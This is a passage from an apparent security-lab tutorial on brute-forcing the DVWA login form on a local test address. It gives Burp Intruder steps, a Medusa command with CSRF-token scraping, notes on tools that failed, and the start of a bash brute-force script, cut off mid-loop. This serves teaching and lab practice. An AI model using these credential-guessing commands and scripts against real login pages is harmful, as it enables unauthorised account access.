&lt;p&gt;&lt;strong&gt;Multiple Users&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now we want to brute force all five users again.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Positions -&gt; Attack type: &lt;code&gt;Cluster bomb&lt;/code&gt;.

&lt;ul&gt;
&lt;li&gt;This supports multiple lists (based on the number of fields in scope. Defined by &lt;code&gt;§value§&lt;/code&gt;), going through each value one by one in the first wordlist, then when it reaches the end to move to the next value in the next list&lt;/li&gt;
&lt;li&gt;For more information about attack types: &lt;a href="https://portswigger.net/burp/help/intruder_positions.html"&gt;https://portswigger.net/burp/help/intruder_positions.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Highlight: &lt;code&gt;username=admin&lt;/code&gt; -&gt; Press: &lt;code&gt;Add §&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;Result: &lt;code&gt;username=§admin§&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Multiple Users" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-31.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Let us now define our usernames to use. This is ID &lt;code&gt;1&lt;/code&gt; as it is the first value (reading left to right, top to bottom).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Payloads -&gt; Payload set: &lt;code&gt;1&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Payload Options [Simple list]

&lt;ul&gt;
&lt;li&gt;Clear.&lt;/li&gt;
&lt;li&gt;Load: &lt;code&gt;/root/users.txt&lt;/code&gt; -&gt; Open&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Multiple Users Intruder" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-32.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;: See Burp says "Payload count: 5"&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Multiple Users Intruder Result" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-33.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Now we need to load in the passwords to try&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (tab) -&gt; 2 -&gt; Payloads -&gt; Payload set: &lt;code&gt;2&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Payload Options [Simple list]

&lt;ul&gt;
&lt;li&gt;Load: &lt;code&gt;/usr/share/seclists/Passwords/rockyou-45.txt&lt;/code&gt; -&gt; Open&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Multiple Users Passwords" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-34.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;: Burp says &lt;code&gt;Payload count: 6,164&lt;/code&gt; (&lt;code&gt;5&lt;/code&gt; * &lt;code&gt;6,164&lt;/code&gt; = &lt;code&gt;30,820&lt;/code&gt;). This means Burp will make ~31k requests to the target (as it will not "break" on a successful login as well as removing values from the username).&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Multiple Users Passwords Results" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-35.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Then, to start the attack (missing in screenshot):&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, there will be an alert explaining the speed will be limited due to the "free edition" of Burp, including "Time-throttled" &amp;amp; limited to 1 thread. I couldn't find exact details of how "slow", but it is noticeably slower. Speed limits may change in later versions too.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Intruder (Top Menu) -&gt; Start attack&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Burp Multiple Users Attack" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-36.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;: Because Burp is not fully aware of a successful login, it will not perform any differently (like Patator), as they are both "fuzzing" the web application. This means it will do every user (even after successfully logging in) until the end of the password list. It will try and make every 30,820 requests to the target web application and with the speed limitation in place so this is less than ideal. &lt;em&gt;Note, there is a &lt;a href="http://forum.portswigger.net/thread/757/stop-intruder-attack-based-response"&gt;feature request ticket to include this feature into Burp&lt;/a&gt;, so in later versions it may be supported.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="Burp Multiple Users Results" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-37.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Failed.Attempts"&gt;&lt;/a&gt;
&lt;h2&gt;Failed Attempts&lt;/h2&gt;

&lt;p&gt;This is because either I did not use the tool correctly or the tool does not yet support the necessary features and options.&lt;/p&gt;

&lt;a name="Medusa"&gt;&lt;/a&gt;
&lt;h3&gt;Medusa&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Did not get Medusa to work correctly. Just kept segmentation faulting.&lt;/p&gt;

&lt;p&gt;Medusa is an older and more well-known brute force tool (I cannot find an exact release date for v1.0, although, v1.1 was reported to be released in May 2006). However, the last stable update was in May 2012, so it does not appear to be under development still.&lt;/p&gt;

&lt;p&gt;I personally did not find the syntax as straightforward as Hydra (having to start with &lt;code&gt;-m&lt;/code&gt;), plus it seemed  to be lacking a few features (such as proxy support), and add on the fact I couldn't get the program to work correctly, as it would say &lt;code&gt;segmentation fault&lt;/code&gt; on all HTTP 200 responses. If an incorrect cookie was used, it would say:
&lt;code&gt;ERROR: The answer was NOT successfully received, understood, and accepted while trying admin admin: error code  302&lt;/code&gt;.
I could not see a way to overwrite this without recompiling the program (so this would not have made the &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;login screen&lt;/a&gt; brute force impossible).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# medusa -u admin -P /root/password.txt -h 192.168.1.44 \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -M web-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -m USER-AGENT:&lt;span class="s2"&gt;&amp;quot;Mozilla&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -m FORM:&lt;span class="s2"&gt;&amp;quot;DVWA/vulnerabilities/brute/&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -m DENY-SIGNAL:&lt;span class="s2"&gt;&amp;quot;Username and/or password incorrect.&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -m FORM-DATA:&lt;span class="s1"&gt;'get?username=&amp;amp;password=&amp;amp;Login=Login'&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -m CUSTOM-HEADER:&lt;span class="s2"&gt;&amp;quot;Cookie: PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -g &lt;span class="m"&gt;5&lt;/span&gt; -r &lt;span class="m"&gt;0&lt;/span&gt; -b -v 4
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;]&lt;/span&gt;    &lt;span class="m"&gt;41094&lt;/span&gt; segmentation fault  medusa -u admin -P /root/password.txt -h 192.168.1.44 -M web-form -m  -m  -m
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Medusa" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low-20.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Nmap"&gt;&lt;/a&gt;
&lt;h3&gt;Nmap&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Nmap does have a script which is able to brute force web forms, however, it is unable to set custom headers in the request, so we cannot log into DVWA.&lt;/p&gt;

&lt;p&gt;Online: &lt;a href="https://nmap.org/nsedoc/scripts/http-form-brute.html"&gt;https://nmap.org/nsedoc/scripts/http-form-brute.html&lt;/a&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# nmap --script-help=http-form-brute&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Starting Nmap 6.49BETA5 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2015-10-23 21:03 BST
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;http-form-brute
&lt;/span&gt;&lt;span class="line"&gt;Categories: intrusive brute
&lt;/span&gt;&lt;span class="line"&gt;https://nmap.org/nsedoc/scripts/http-form-brute.html
&lt;/span&gt;&lt;span class="line"&gt;  Performs brute force password auditing against http form-based authentication.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  This script uses the unpwdb and brute libraries to perform password
&lt;/span&gt;&lt;span class="line"&gt;  guessing. Any successful guesses are stored in the nmap registry, using
&lt;/span&gt;&lt;span class="line"&gt;  the creds library, &lt;span class="k"&gt;for&lt;/span&gt; other scripts to use.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  The script automatically attempts to discover the form method, action, and
&lt;/span&gt;&lt;span class="line"&gt;  field names to use in order to perform password guessing. &lt;span class="o"&gt;(&lt;/span&gt;Use argument
&lt;/span&gt;&lt;span class="line"&gt;  path to specify the page where the form resides.&lt;span class="o"&gt;)&lt;/span&gt; If it fails doing so
&lt;/span&gt;&lt;span class="line"&gt;  the form components can be supplied using arguments method, path, uservar,
&lt;/span&gt;&lt;span class="line"&gt;  and passvar. The same arguments can be used to selectively override
&lt;/span&gt;&lt;span class="line"&gt;  the detection outcome.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  After attempting to authenticate using a HTTP GET or POST request the script
&lt;/span&gt;&lt;span class="line"&gt;  analyzes the response and attempts to determine whether authentication was
&lt;/span&gt;&lt;span class="line"&gt;  successful or not. The script analyzes this by checking the response using
&lt;/span&gt;&lt;span class="line"&gt;  the following rules:
&lt;/span&gt;&lt;span class="line"&gt;     1. If the response was empty the authentication was successful.
&lt;/span&gt;&lt;span class="line"&gt;     2. If the onsuccess argument was provided &lt;span class="k"&gt;then&lt;/span&gt; the authentication either
&lt;/span&gt;&lt;span class="line"&gt;        succeeded or failed depending on whether the response body contained
&lt;/span&gt;&lt;span class="line"&gt;        the message/pattern passed in the onsuccess argument.
&lt;/span&gt;&lt;span class="line"&gt;     3. If no onsuccess argument was passed, and &lt;span class="k"&gt;if&lt;/span&gt; the onfailure argument
&lt;/span&gt;&lt;span class="line"&gt;        was provided &lt;span class="k"&gt;then&lt;/span&gt; the authentication either succeeded or failed
&lt;/span&gt;&lt;span class="line"&gt;        depending on whether the response body does not contain
&lt;/span&gt;&lt;span class="line"&gt;        the message/pattern passed in the onfailure argument.
&lt;/span&gt;&lt;span class="line"&gt;     4. If neither the onsuccess nor onfailure argument was passed and the
&lt;/span&gt;&lt;span class="line"&gt;        response contains a form field named the same as the submitted
&lt;/span&gt;&lt;span class="line"&gt;        password parameter &lt;span class="k"&gt;then&lt;/span&gt; the authentication failed.
&lt;/span&gt;&lt;span class="line"&gt;     5. Authentication was successful.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;a name="Ncrack"&gt;&lt;/a&gt;
&lt;h3&gt;Ncrack&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Ncrack v0.4ALPHA does not support web forms. It is only able to-do HTTP basic access authentication.&lt;/p&gt;

&lt;p&gt;Ncrack was written in 2009, and has not been updated since. Development has been moved into nmap's scripts instead.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Metasploit.Framework"&gt;&lt;/a&gt;
&lt;h3&gt;Metasploit Framework&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Metasploit framework v4.11.4-2015090201 does not support web forms, but rather HTTP basic access authentication (&lt;code&gt;auxiliary/scanner/http/http_login&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Online: &lt;a href="http://www.rapid7.com/db/modules/auxiliary/scanner/http/http_login"&gt;http://www.rapid7.com/db/modules/auxiliary/scanner/http/http_login&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;...however, knowing what the development is like, I am sure one day it will be in there ;-).&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Proof.of.Concept.Scripts"&gt;&lt;/a&gt;
&lt;h2&gt;Proof of Concept Scripts&lt;/h2&gt;

&lt;p&gt;Here are two Proof of Concept (PoC) scripts (one in &lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-bruteforce-low-http-get.sh"&gt;Bash&lt;/a&gt; and the other is &lt;a href="https://github.com/g0tmi1k/boot2root-scripts/blob/master/dvwa-bruteforce-low-http-get.py"&gt;Python&lt;/a&gt;). They are really rough templates, and not stable tools to be keep on using. They are not meant to be "fancy" (e.g. no timeouts or no multi-threading). However, they can be fully customised in the attack (such as if we want to use a new anti-CSRF token on each request etc.).&lt;/p&gt;

&lt;p&gt;I will put this all on &lt;a href="https://github.com/g0tmi1k/boot2root-scripts/"&gt;GitHub at the following repository: github.com/g0tmi1k/boot2root-scripts/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Benchmark&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Bash&lt;/strong&gt;: ~2.0 seconds&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: ~3.4 seconds&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Bash.Template"&gt;&lt;/a&gt;
&lt;h3&gt;Bash Template&lt;/h3&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;span class="line-number"&gt;45&lt;/span&gt;
&lt;span class="line-number"&gt;46&lt;/span&gt;
&lt;span class="line-number"&gt;47&lt;/span&gt;
&lt;span class="line-number"&gt;48&lt;/span&gt;
&lt;span class="line-number"&gt;49&lt;/span&gt;
&lt;span class="line-number"&gt;50&lt;/span&gt;
&lt;span class="line-number"&gt;51&lt;/span&gt;
&lt;span class="line-number"&gt;52&lt;/span&gt;
&lt;span class="line-number"&gt;53&lt;/span&gt;
&lt;span class="line-number"&gt;54&lt;/span&gt;
&lt;span class="line-number"&gt;55&lt;/span&gt;
&lt;span class="line-number"&gt;56&lt;/span&gt;
&lt;span class="line-number"&gt;57&lt;/span&gt;
&lt;span class="line-number"&gt;58&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Quick PoC template for HTTP GET form brute force&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Target: DVWA v1.10 (Brute Force - Low)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#   Date: 2015-10-25&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Author: g0tmi1k ~ https://blog.g0tmi1k.com/&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Variables&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;DVWA_USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;DVWA_PASS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;USER_LIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/share/seclists/Usernames/top_shortlist.txt&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;PASS_LIST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/share/seclists/Passwords/rockyou.txt&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Value to look for in response (Whitelisting)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SUCCESS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Welcome to the password protected area&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Anti CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$( curl -s -c /tmp/dvwa.cookie &amp;quot;&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;URL&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;/login.php&lt;span class="s2"&gt;&amp;quot; | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;'&amp;quot; -f2 )&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;sed -i '&lt;/span&gt;/security/d&lt;span class="s1"&gt;' /tmp/dvwa.cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;## Login to DVWA core&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;curl -s -b /tmp/dvwa.cookie -d &amp;quot;username=${DVWA_USER}&amp;amp;password=${DVWA_PASS}&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;${URL}/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="s1"&gt;[[ &amp;quot;$?&amp;quot; -ne 0 ]] &amp;amp;&amp;amp; echo -e '&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;!&lt;span class="o"&gt;]&lt;/span&gt; Issue connecting! &lt;span class="c"&gt;#1' &amp;amp;&amp;amp; exit 1&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Counter&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Password loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; -r _PASS&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="c"&gt;## Username loop&lt;/span&gt;
